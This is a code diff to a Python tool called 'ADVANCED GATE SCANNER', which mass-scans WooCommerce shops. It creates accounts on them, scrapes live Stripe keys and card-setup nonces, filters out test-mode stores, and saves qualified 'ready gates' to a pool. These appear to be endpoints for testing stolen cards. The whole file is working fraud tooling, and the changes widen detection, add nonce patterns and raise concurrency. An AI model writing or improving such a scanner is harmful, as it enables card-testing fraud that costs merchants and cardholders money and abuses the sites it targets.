@@ -38,7 +38,6 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict
                 if r.status_code != 200:
                     return None
                 html = r.text
-                headers = dict(r.headers)
         except Exception:
             return None
 
@@ -60,11 +59,20 @@ async def probe_stage1_fast_surface(domain: str, sem: asyncio.Semaphore) -> dict
     pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', html)
     pk_live = pk_m[0] if pk_m else None
 
+    has_stripe_indicator = (
+        pk_live is not None or
+        "wc-stripe" in html or
+        "stripe.js" in html or
+        "wc_stripe" in html or
+        "payment_method_stripe" in html
+    )
+
     return {
         "domain": domain,
         "base": base,
         "reg_nonce": reg_nonce,
         "pk_live": pk_live,
+        "has_stripe": has_stripe_indicator
     }
 
 
@@ -116,13 +124,18 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                 r_post = await s.post(reg_url, data=body, headers=headers, timeout=12)
                 
                 cookies = s.cookies.get_dict()
-                if not any("wordpress_logged_in" in k for k in cookies):
+                logged_in = any("wordpress_logged_in" in k for k in cookies)
+                if not logged_in:
                     return None
 
                 # === STAGE 3: Authenticated Scrape add-payment-method ===
                 add_pm_url = f"{base}/my-account/add-payment-method/"
                 r_pm = await s.get(add_pm_url, timeout=10)
                 pm_html = r_pm.text
+
+                # Check if test mode explicitly
+                if "pk_test_" in pm_html and "pk_live_" not in pm_html:
+                    return None
 
                 pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
                 pk = pk_m[0] if pk_m else ""
@@ -132,6 +145,12 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                 
                 legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
                 legacy_nonce = legacy_m.group(1) if legacy_m else ""
+
+                if not legacy_nonce:
+                    # Alternative legacy nonce parameter
+                    leg2_m = re.search(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
+                    if leg2_m:
+                        legacy_nonce = leg2_m.group(1)
 
                 if not pk or (not upe_nonce and not legacy_nonce):
                     return None
@@ -195,7 +214,7 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
                 conf_resp = r_conf.json()
 
                 raw_str = json.dumps(conf_resp).lower()
-                if "testmode_charges_only" in raw_str or "secret_key_required" in raw_str:
+                if "testmode_charges_only" in raw_str or "secret_key_required" in raw_str or "livemode" in raw_str and "false" in raw_str:
                     return None
 
                 is_live_verdict = (
@@ -228,7 +247,7 @@ async def probe_stage2_3_4_qualification(domain: str, base: str, initial_nonce: 
 
 async def main():
     print("=" * 80)
-    print("[*] ADVANCED GATE SCANNER v3 (curl_cffi Chrome TLS-Engine)")
+    print("[*] ADVANCED GATE SCANNER v4 (curl_cffi Chrome TLS Multi-Surface Engine)")
     print("=" * 80)
     
     # 1. Load candidate domains
@@ -254,10 +273,23 @@ async def main():
     raw_domains = sorted(list(set(cleaned)))
     print(f"[*] Loaded {len(raw_domains)} sanitized candidate domains.", flush=True)
 
+    # Load existing verified ready gates to preserve them
+    existing_ready = []
+    ready_file = os.path.join("data", "ready_gates.json")
+    if os.path.exists(ready_file):
+        try:
+            with open(ready_file, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                if isinstance(data, list):
+                    existing_ready = data
+            print(f"[*] Loaded {len(existing_ready)} existing ready gates from pool.")
+        except Exception:
+            pass
+
     # 2. DNS resolve
     print("[*] Stage 0: Pre-resolving DNS...", flush=True)
     live_dns_domains = []
-    with ThreadPoolExecutor(max_workers=40) as pool:
+    with ThreadPoolExecutor(max_workers=50) as pool:
         results = pool.map(resolve_dns, raw_domains)
         for r in results:
             if r:
@@ -266,7 +298,7 @@ async def main():
 
     # 3. Stage 1: Fast Surface Probing
     print(f"\n[*] Stage 1: Fast Surface Probing on {len(live_dns_domains)} domains...", flush=True)
-    sem_s1 = asyncio.Semaphore(25)
+    sem_s1 = asyncio.Semaphore(30)
     s1_tasks = [probe_stage1_fast_surface(d, sem_s1) for d in live_dns_domains]
     s1_results = await asyncio.gather(*s1_tasks)
     s1_passed = [r for r in s1_results if r]
@@ -280,24 +312,30 @@ async def main():
         for s in s1_passed
     ]
     deep_results = await asyncio.gather(*deep_tasks)
-    ready_gates = [r for r in deep_results if r]
+    new_ready_gates = [r for r in deep_results if r]
+
+    # Merge newly found gates with existing ready gates (deduplicate by domain)
+    ready_dict = {g["domain"]: g for g in existing_ready}
+    for g in new_ready_gates:
+        ready_dict[g["domain"]] = g
+    final_ready_gates = list(ready_dict.values())
 
     print("\n" + "=" * 80)
-    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES FOUND: {len(ready_gates)}")
+    print(f"[🔥] FINAL QUALIFIED SETUPINTENT GATES IN POOL: {len(final_ready_gates)}")
     print("=" * 80)
     
-    for g in ready_gates:
-        print(f"  [READY] {g['domain']:32} | Type: {g['gate_type']:18} | PK: {g['pk_live'][:24]}...")
+    for g in final_ready_gates:
+        pk_display = g.get('pk_live', '')[:24] + "..." if g.get('pk_live') else "N/A"
+        print(f"  [READY] {g['domain']:32} | Type: {g.get('gate_type', 'unknown'):18} | PK: {pk_display}")
 
     os.makedirs("data", exist_ok=True)
-    ready_file = os.path.join("data", "ready_gates.json")
     with open(ready_file, "w", encoding="utf-8") as f:
-        json.dump(ready_gates, f, indent=2)
+        json.dump(final_ready_gates, f, indent=2)
 
     active_file = os.path.join("data", "active_surfaces.json")
     with open(active_file, "w", encoding="utf-8") as f:
-        json.dump(ready_gates, f, indent=2)
-    print(f"\n[+] Saved to {ready_file} and {active_file}")
+        json.dump(final_ready_gates, f, indent=2)
+    print(f"\n[+] Saved {len(final_ready_gates)} ready gates to {ready_file} and {active_file}")
 
 
 if __name__ == "__main__":
